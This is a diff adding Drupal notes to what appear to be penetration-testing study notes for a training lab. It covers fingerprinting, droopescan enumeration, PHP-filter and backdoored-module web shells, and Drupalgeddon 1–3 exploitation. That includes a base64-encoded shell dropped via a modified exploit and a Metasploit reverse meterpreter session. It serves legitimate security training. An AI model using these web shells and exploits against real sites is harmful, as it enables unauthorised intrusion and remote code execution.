@@ -15,8 +15,18 @@
     - [Enumeration](#enumeration-1)
   - [Joomla - Attack](#joomla---attack)
     - [Abusing Built-In Functionality](#abusing-built-in-functionality)
-    - [Leveraging Known Vulnerabilities](#leveraging-known-vulnerabilities)
+    - [Leveraging Known Vulns](#leveraging-known-vulns-1)
       - [CVE-2019-10945](#cve-2019-10945)
+  - [Drupal - Discovery \& Enum](#drupal---discovery--enum)
+    - [Discover/Footprinting](#discoverfootprinting)
+    - [Enumeration](#enumeration-2)
+  - [Drupal - Attack](#drupal---attack)
+    - [Leveraging the PHP Filter Module](#leveraging-the-php-filter-module)
+    - [Uploading a Backdoored Module](#uploading-a-backdoored-module)
+    - [Leveraging Known Vulns](#leveraging-known-vulns-2)
+      - [Drupalgeddon](#drupalgeddon)
+      - [Drupalgeddon 2](#drupalgeddon-2)
+      - [Drupalgeddon 3](#drupalgeddon-3)
 
 ---
 
@@ -720,7 +730,7 @@ d41y@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### Leveraging Known Vulnerabilities
+### Leveraging Known Vulns
 
 #### CVE-2019-10945
 
@@ -767,5 +777,322 @@ htaccess.txt
 index.php
 robots.txt
 web.config.txt
+```
+
+## Drupal - Discovery & Enum
+
+### Discover/Footprinting
+
+A Drupal website can be identified in several ways, including by the header or footer message "Powered by Drupal", the standard Drupal loga, the presence of a CHANGELOG.txt file or README.txt file, via the page source, or clues in the robots.txt such as references to ```/node```.
+
+```bash
+d41y@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal
+
+<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
+      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
+```
+
+Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form ```/node/<nodeid>```.
+
+Drupal supports three types of users by default:
+
+1. **Administrator**: This user has complete control over the Drupal website.
+2. **Authenticated User**: These users can log in to the website and perform operations such as adding and editing articles based on their permission.
+3. **Anonymous**: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.
+
+### Enumeration
+
+Once you have discovered a Drupal instance, you can do a combination of manual and tool-based enumeration to uncover the version, installed plugins, and more. Depending on the Drupal version and any hardening measures that have been put in place, you may need to try several ways to identify the version number. Newer installs of Drupal by default block access to the CHANGELOG.txt and README.txt files, so you may need to do further enumeration. Look at an example of enumerating the version number using the CHANGELOG.txt file. To do so, you can use cURL along with grep, sed, head, etc.
+
+```bash
+d41y@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+
+Drupal 7.57, 2018-02-21
+```
+
+Here you have identified an older version of Drupal in use. Trying this against the latest Drupal version at the time of writing, you get a 404 response.
+
+```bash
+d41y@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
+
+<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "http://drupal.inlanefreight.local/CHANGELOG.txt" was not found on this server.</p></body></html>
+```
+
+There are several other things you could check in this instance to identify the version. Try a scan with droopescan. Droopescan has much more functionality for Drupal than it does for Joomla.
+
+```bash
+d41y@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local
+
+[+] Plugins found:                                                              
+    php http://drupal.inlanefreight.local/modules/php/
+        http://drupal.inlanefreight.local/modules/php/LICENSE.txt
+
+[+] No themes found.
+
+[+] Possible version(s):
+    8.9.0
+    8.9.1
+
+[+] Possible interesting urls found:
+    Default admin - http://drupal.inlanefreight.local/user/login
+
+[+] Scan finished (0:03:19.199526 elapsed)
+```
+
+The instance appears to be running version 8.9.1 of Drupal. At the time of writing, this was not the latest as it was released in June 2020. A quick search for Drupal-related vulns does not show anything apparent for this core version of Drupal.
+
+## Drupal - Attack
+
+### Leveraging the PHP Filter Module
+
+In older versions of Drupal, it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated".
+
+![attacking cms 5](../../../images/attacking_cms5.png)
+
+From here, you could tick the check box next to the module and scroll down to "Save Configuration". Next, you could go to "Content" -> "Add content" -> create a "Basic page".
+
+![attacking cms 6](../../../images/attacking_cms6.png)
+
+You can now create a page with a malicious PHP snippet such as the one below. You named the parameter with an md5 hash instead of the common ```cmd``` to get in the practice of not potentially leaving a door open to an attacker during your assessment.
+
+```php
+<?php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+?>
+```
+
+You also want to make sure to set "Text format" drop-down to "PHP code". After clicking "save", you will be redirected to the new page. Once saved, you can either request execute commands in the browser by appending ```?dcfdd5e021a869fcc6dfaef8bf31377e=id``` to the end of the URl to run the ```id``` command or use cURL on the command line. From here, you could use a bash one-liner to obtain reverse shell access.
+
+```bash
+d41y@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, you would have to install the module yourself. Since you would be changing and adding something to the client's Drupal instance, you may want to check with them first. You would start by downloading the most recent version of the module from the Drupal website.
+
+```bash
+d41y@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+```
+
+Once downloaded got to "Administration" -> "Reports" -> "Available updates".
+
+From here, click on "Browse", select the file from the directory you downloaded it to, and then click "Install".
+
+Once the module is installed, you can click on "Content" and create a new basic page. Be sure to select "PHP code" from the "Text format" dropdown.
+
+### Uploading a Backdoored Module
+
+Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website.
+
+Download the archive (_CAPTCHA module as an example_) and extract its contents:
+
+```bash
+d41y@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+d41y@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
+```
+
+Create a PHP web shell with the contents:
+
+```php
+<?php
+system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
+?>
+```
+
+Next, you need to create a .htaccess file to give yourself access to the folder. This is necessary as Drupal denies direct acces to the ```/modules``` folder.
+
+```bash
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+```
+
+The configuration above will apply rules for the ```/``` folder when you request a file in ```/modules```. Copy both of these files to the captcha folder and create an archive.
+
+```bash
+d41y@htb[/htb]$ mv shell.php .htaccess captcha
+d41y@htb[/htb]$ tar cvf captcha.tar.gz captcha/
+
+captcha/
+captcha/.travis.yml
+captcha/README.md
+captcha/captcha.api.php
+captcha/captcha.inc
+captcha/captcha.info.yml
+captcha/captcha.install
+
+<SNIP>
+```
+
+Assuming you have administrative access to the website, click on "Manage" and then "Extend" on the sidebar. Next, click on the "+ Install new module" button, and you will be taken to the install page. Browse to the backdoored Captcha archive and click "Install".
+
+Once the installation succeeds, browse to the ```/modules/captcha/shell.php``` to execute commands.
+
+```bash
+d41y@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Leveraging Known Vulns
+
+#### Drupalgeddon
+
+This flaw, can be exploited by leveraging a pre-authenticated SQLi which can be used to upload malicious code or add an admin user.
+
+Running the [script](https://www.exploit-db.com/exploits/34992) and see if you get a new admin user:
+
+```bash
+d41y@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+
+<SNIP>
+
+[!] VULNERABLE!
+
+[!] Administrator user created!
+
+[*] Login: hacker
+[*] Pass: pwnd
+[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
+```
+
+#### Drupalgeddon 2
+
+You can use this [script](https://www.exploit-db.com/exploits/44448) to confirm this vuln.
+
+```bash
+d41y@htb[/htb]$ python3 drupalgeddon2.py 
+
+################################################################
+# Proof-Of-Concept for CVE-2018-7600
+# by Vitalii Rudnykh
+# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
+# https://github.com/a2u/CVE-2018-7600
+################################################################
+Provided only for educational or information purposes
+
+Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
+
+Check: http://drupal-dev.inlanefreight.local/hello.txt
+```
+
+You can check quickyl with cURL and see that the hello.txt file was indeed uploaded.
+
+```bash
+d41y@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
+
+;-)
+```
+
+Now modify the script to gain RCE by uploading a malicious PHP file.
+
+```php
+<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
+```
+
+```bash
+d41y@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
+```
+
+Now, replace the ```echo``` command in the exploit script with a command to write out your malicious PHP script.
+
+```bash
+echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+```
+
+Next, run the modified exloit script to upload your malicious PHP file.
+
+```bash
+d41y@htb[/htb]$ python3 drupalgeddon2.py 
+
+################################################################
+# Proof-Of-Concept for CVE-2018-7600
+# by Vitalii Rudnykh
+# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
+# https://github.com/a2u/CVE-2018-7600
+################################################################
+Provided only for educational or information purposes
+
+Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
+
+Check: http://drupal-dev.inlanefreight.local/mrb3n.php
+```
+
+Finally, you can confirm RCE using cURL.
+
+```bash
+d41y@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+``` 
+
+#### Drupalgeddon 3
+
+... is an authenticated RCE vuln that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. You can exploit this using Metasploit, but you must first log in and obtain a valid session cookie.
+
+Once you have the session cookie, you can set up the exploit module as follows:
+
+```bash
+msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
+msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
+msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
+msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
+msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
+msf6 exploit(multi/http/drupal_drupageddon3) > show options 
+
+Module options (exploit/multi/http/drupal_drupageddon3):
+
+   Name            Current Setting                                                                   Required  Description
+   ----            ---------------                                                                   --------  -----------
+   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
+   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
+   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT           80                                                                                yes       The target port (TCP)
+   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
+   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   User register form with exec
+```
+
+If successful, you will obtain a reverse shell on the target host.
+
+```bash
+msf6 exploit(multi/http/drupal_drupageddon3) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
+[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
+[*] Sending stage (39264 bytes) to 10.129.42.195
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400
+
+meterpreter > getuid
+
+Server username: www-data (33)
+
+
+meterpreter > sysinfo
+
+Computer    : app01
+OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
+Meterpreter : php/linux
 ```
 
